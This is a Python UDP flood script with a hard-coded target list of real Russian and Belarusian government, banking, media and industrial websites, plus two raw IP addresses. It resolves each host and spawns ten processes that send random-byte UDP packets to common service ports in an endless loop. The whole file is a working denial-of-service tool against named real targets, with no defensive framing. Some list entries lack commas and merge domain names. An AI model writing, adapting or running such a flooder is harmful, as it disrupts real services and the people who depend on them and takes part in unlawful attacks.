import time
import socket
import random
import multiprocessing

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

used_random_ports = [80, 443, 21, 22, 110, 995, 143, 993, 26, 587, 3306, 2082, 2083, 2086, 2087, 2095, 2096, 2077, 2078]

port_value = random.choice(used_random_ports)
#############
# with open('sites.txt') as f:
#     sites = f.readlines()

sites = [
    "smotrim.ru",
    "ticketbus.by",
    "lenta.ru",
    "ria.ru",
    "www.rbc.ru",
    "www.rt.com",
    "smotrim.ru",
    "tass.ru",
    "tvzvezda.ru",
    "vsoloviev.ru",
    "api.developer.sber.ru",
    "www.1tv.ru",
    "www.vesti.ru",
    "zakupki.gov.ru",
    "er.ru",
    "www.rzd.ru",
    "rzdlog.ru",
    "vgtrk.ru",
    "www.interfax.ru",
    #"ugmk.ua",
    "iz.ru",
    "vz.ru",
    "sputniknews.ru",
    "www.gazeta.ru",
    "www.kp.ru",
    "riafan.ru",
    "pikabu.ru",
    "www.kommersant.ru",
    "omk.ru",
    "www.yaplakal.com",
    "bezformata.com",
    "www.gazprom.ru",
    "lukoil.ru",
    "magnit.ru",
    "www.nornickel.com",
    "www.surgutneftegas.ru",
    "www.tatneft.ru",
    "www.evraz.com",
    "nlmk.com",
    "www.sibur.ru",
    "www.severstal.com",
    "www.metalloinvest.com",
    "nangs.org",
    "rmk-group.ru",
    "www.tmk-group.ru",
    "ya.ru",
    "omk.ru",
    "www.polymetalinternational.com",
    "www.uralkali.com",
    "www.eurosib.ru",
    "www.sberbank.ru",
    "online.sberbank.ru",
    "www.vtb.ru",
    "www.gazprombank.ru",
    "gosuslugi.ru",
    "www.mos.ru",
    "kremlin.ru",
    "en.kremlin.ru",
    "government.ru",
    "mil.ru",
    "www.nalog.gov.ru",
    "customs.gov.ru",
    "pfr.gov.ru",
    "rkn.gov.ru",
    "109.207.1.118",
    "109.207.1.97",
    "mail.rkn.gov.ru",
    "cloud.rkn.gov.ru",
    "mvd.gov.ru",
    "pwd.wto.economy.gov.ru",
    "stroi.gov.ru",
    "proverki.gov.ru",
    "belta.by",
    "sputnik.by",
    "tvr.by",
    "sb.by",
    "belmarket.by",
    "belarus.by",
    "belarus24.by",
    "ont.by",
    "024.by",
    "belnovosti.by",
    "mogilevnews.by",
    "mil.by",
    "yandex.by",
    "slonves.by",
    "ctv.by",
    "radiobelarus.by",
    "radiusfm.by",
    "alfaradio.by",
    "radiomir.by",
    "radiostalica.by",
    "radiobrestfm.by",
    "tvrmogilev.by",
    "minsknews.by",
    "zarya.by",
    "grodnonews.by"
    "lenta.ru",
    "ria.ru",
    "www.rbc.ru",
    "www.rt.com",
    "smotrim.ru",
    "tass.ru",
    "tvzvezda.ru",
    "www.vesti.ru",
    "er.ru",
    "vgtrk.ru",
    "www.interfax.ru",
    "iz.ru",
    "vz.ru",
    "sputniknews.ru",
    "pikabu.ru"
    "www.kommersant.ru",
    "lukoil.ru",
    "www.nornickel.com"
    "www.evraz.com",
    "nlmk.com",
    "www.sibur.ru"
    "www.metalloinvest.com"
    "rmk-group.ru",
    "www.tmk-group.ru",
    "ya.ru",
    "omk.ru",
    "www.uralkali.com"
    "www.mos.ru"
    "rkn.gov.ru",
    "cloud.rkn.gov.ru",
    "stroi.gov.ru",
    "belta.by",
    "sputnik.by"
    "belmarket.by",
    "Belnovisti.by",
    "yandex.by",
    "iecp.ru"
    "iecp.ru"
    "uc-osnovanie.ru"
    "www.roseltorg.ru"
    "www.cit-ufa.ru"
    "cfmc.ru"
]
ips = []
print("Targeted sites: \n")


def dns_resolve():
    global sent
    for site in sites:
        site = site.replace("http://", "")
        site = site.replace("https://", "")
        site = site.replace(",", "")
        site = site.replace('"', "")
        site = site.replace("'", "")
        site = site.replace("\n", "")
        site = site.replace("\t", "")
        if site[-1] == "/":
            site = site[:-1]
        print('"' + site + '",')
        try:
            ips.append(socket.gethostbyname(site))
        except:
            print(f"Could not resolve:  {site} ")

    port = 1
    sent = 0


def send_packets():
    while True:
        global sent, port_value
        for ip in ips:
            port_value = random.choice(used_random_ports)
            sock.sendto(bytes, (ip, port_value))
            print("Sent {} packets to {} thought port: {} size {}".format(sent, ip, port_value, packet_size))
            sent = sent + 1
            # port = port + 2
            # if port > 65534:
            #     port = 1
            time.sleep(0.001)


dns_resolve()

process_list = []
for i in range(10):
    packet_size = random.randint(10, 20)
    bytes = random._urandom(packet_size)

    p = multiprocessing.Process(target=send_packets)
    p.start()
    process_list.append(p)

for process in process_list:
    process.join()
